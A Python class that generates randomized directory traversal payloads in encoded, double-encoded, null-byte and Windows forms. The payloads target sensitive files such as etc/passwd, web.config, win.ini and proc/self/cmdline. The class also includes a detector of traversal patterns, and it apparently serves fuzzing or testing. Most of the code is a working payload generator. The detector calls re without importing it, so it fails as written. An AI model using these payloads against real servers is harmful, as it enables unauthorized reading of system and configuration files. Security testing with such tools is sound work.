import random

class DirectoryTraversalPayloadGenerator:
    """
    Generates various types of Directory Traversal payloads with randomized components.
    """

    @staticmethod
    def is_dt_payload(payload: str) -> bool:
        """
        Checks if a given string payload contains common directory traversal patterns.

        Args:
            payload: The string to check.

        Returns:
            True if it's likely a directory traversal payload, False otherwise.
        """
        if not isinstance(payload, str):
            return False

        # Common directory traversal patterns
        # - ../ or ..\ (and variations with encoding)
        # - /../ or \..\
        # - URL encoded variations (%2e%2e%2f, %2e%2e/, %2e%2e\ etc.)
        # - Double URL encoded variations (e.g., %252e%252e%252f)
        dt_patterns = [
            r'\.\./',        # ../
            r'\.\.\\',       # ..\
            r'%2e%2e%2f',    # ../ URL encoded
            r'%2e%2e%5c',    # ..\ URL encoded
            r'%252e%252e%252f', # ../ double URL encoded
            r'%252e%252e%255c', # ..\ double URL encoded
            r'\.\./\.\./',   # ../../
            r'\.\.\\\.\.\\', # ..\..\
            r'/etc/passwd',  # Specific file often targeted
            r'boot.ini',     # Specific file often targeted (Windows)
            r'proc/self/cwd',# Linux specific
            r'WEB-INF',      # Java specific directory
        ]

        # Combine patterns into a single regex for efficiency
        # re.IGNORECASE to catch ".." and "..\" variations
        # re.DOTALL to allow matching across newlines if the payload is multi-line
        combined_pattern = re.compile('|'.join(dt_patterns), re.IGNORECASE | re.DOTALL)

        return bool(combined_pattern.search(payload))
    
    @staticmethod
    def _get_random_path_separator() -> str:
        """Returns a random path separator style."""
        return random.choice(["/", "\\", "%2f", "%5c", "%252f", "%255c"]) # / \ URL-encoded / \ double-encoded / \

    @staticmethod
    def _get_random_dot_dot() -> str:
        """Returns a random '..' or '..\' sequence."""
        return random.choice(["..", "..%2f", "..%5c", "%2e%2e", "%2e%2e%2f", "%2e%2e%5c", "....//"])

    @staticmethod
    def _get_random_target_file() -> str:
        """Returns a random sensitive target file."""
        return random.choice([
            "etc/passwd", "windows/win.ini", "boot.ini", "web.config",
            "WEB-INF/web.xml", "proc/self/cmdline", "var/log/apache2/access.log"
        ])

    @staticmethod
    def generate_basic_payload() -> str:
        """Generates a basic ../../etc/passwd style payload."""
        depth = random.randint(3, 10) # Random depth
        return f"{DirectoryTraversalPayloadGenerator._get_random_dot_dot()}{DirectoryTraversalPayloadGenerator._get_random_path_separator()}" * depth + \
               DirectoryTraversalPayloadGenerator._get_random_target_file()

    @staticmethod
    def generate_encoded_payload() -> str:
        """Generates a payload with URL-encoded or double-encoded parts."""
        depth = random.randint(3, 10)
        dot_dot = random.choice(["%2e%2e", "%2e%2e%2f", "%2e%2e%5c", "%252e%252e%252f"]) # More encoded options
        separator = random.choice(["%2f", "%5c", "%252f", "%255c"])
        target = DirectoryTraversalPayloadGenerator._get_random_target_file()
        return f"{dot_dot}{separator}" * depth + target

    @staticmethod
    def generate_null_byte_payload() -> str:
        """Generates a payload with a null byte (%00) for truncation."""
        depth = random.randint(3, 7)
        path = f"{DirectoryTraversalPayloadGenerator._get_random_dot_dot()}{DirectoryTraversalPayloadGenerator._get_random_path_separator()}" * depth + \
               DirectoryTraversalPayloadGenerator._get_random_target_file()
        return f"{path}%00random_suffix.jpg" # Append null byte to truncate

    @staticmethod
    def generate_windows_payload() -> str:
        """Generates a Windows-style path traversal payload."""
        depth = random.randint(3, 10)
        dot_dot = random.choice(["..", "..\\", "..%5c"])
        target = random.choice(["windows\\win.ini", "boot.ini", "inetpub\\wwwroot\\web.config"])
        return f"{dot_dot}\\" * depth + target

    @staticmethod
    def get_random_dt_payload() -> str:
        """Returns a random Directory Traversal payload by choosing from different generation types."""
        generator_functions = [
            DirectoryTraversalPayloadGenerator.generate_basic_payload,
            DirectoryTraversalPayloadGenerator.generate_encoded_payload,
            DirectoryTraversalPayloadGenerator.generate_null_byte_payload,
            DirectoryTraversalPayloadGenerator.generate_windows_payload,
        ]
        chosen_generator = random.choice(generator_functions)
        return chosen_generator()

